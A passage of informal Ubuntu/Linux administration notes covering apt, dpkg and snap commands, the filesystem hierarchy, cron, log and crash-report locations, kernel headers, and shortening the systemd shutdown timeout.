3. Creating a file like new_repo.list in /etc/apt/sources.list.d and entering the repository information

Common commands in apt:
* Install package:    sudo apt install <package> (-y: automatic yes to prompts)
* Remove package:     sudo apt remove <package>
* Update package db:  sudo apt update
* Upgrade packages:   sudo apt upgrade

To install a package from a .deb file you can use either:
    1. sudo dpkg -i <file> (if install fails due to missing dependencies use 'apt-get -f install' and install again)
    2. sudo apt-get install -y ./file> (with the benefit that dependencies will be installed)

Install a package from a .bundle file: sudo chmod +x <file> && sudo ./<file>

Consider using snap, a command that manages snaps, packages that work across many different Linux distributions.
Update snap:            sudo snap refresh <snap>
Update all snaps:       sudo snap refresh
List available updates: sudo snap refresh --list

Where to place executables or whole packages:
/                     System-wide essential packages
/usr                  Software installed from the distribution's packages
/usr/local            Locally compiled and installed software packages
$HOME | $HOME/.local  Only user packages

* The idea behind this separation is to avoid clashes with distributed software.
* The Filesystem Hierarchy Standard (FHS) defines the structure of file systems on Linux and other UNIX-like operating systems.
* The directories used for packages (/usr, /usr/local, etc) have the following hierarchy:
    /bin      binaries
    /etc      Host-specific system configuration for binaries
    /games    Game binaries
    /include  C header files
    /lib      Libraries
    /lib64    64-bit libraries
    /man      Online manuals
    /sbin     System binaries
    /share    Architecture-independent hierarchy
    /src      Source code


Automation:

Users may want to schedule a certain action or task to take place after the system has booted. Take, for example, running commands, backing up files, or launching your favourite programs.
Crontab is one of the processes that is started during boot, which is responsible for facilitating and managing cron jobs.
A crontab is simply a special file with formatting that is recognised by the cron process to execute each line step-by-step.
Crontabs can be edited by using crontab -e. Use cron job generators as https://crontab.guru to make it easier.


Logs:

Located in the /var/log directory, these files and folders contain logging information for applications and services running on your system.
These services and logs are a great way in monitoring the health of your system and protecting it. Not only that, but the logs for services such as a web server contain information about every single request - allowing developers or administrators to diagnose performance issues or investigate an intruder's activity.


Crash reports:

Ubuntu uses Apport to automatically collect data from crashed processes and compile a problem report in /var/crash (you can delete all the files in this dir to get rid of startup error messages like "System program problem detected").


Linux kernel headers:

They define an interface. They specify how the functions in the source file are defined.
They are used so that a compiler can check if the usage of a function is correct as the function signature (return value and parameters) is present in the header file. For this task the actual implementation of the function is not necessary.
You could do the same with the complete kernel sources but you will install a lot of unnecessary files.


Reboot takes too long:

In Ubuntu, it's usually the snap daemon that causes a delay to the shutdown process. When Ubuntu it's shutting down, press F2 to see what is happening.
You can change the time delay before Ubuntu force stops the process:
sudo vim /etc/systemd/system.conf
Remove # at the beginning of DefaultTimeoutStopSec=90s and change value to 5s

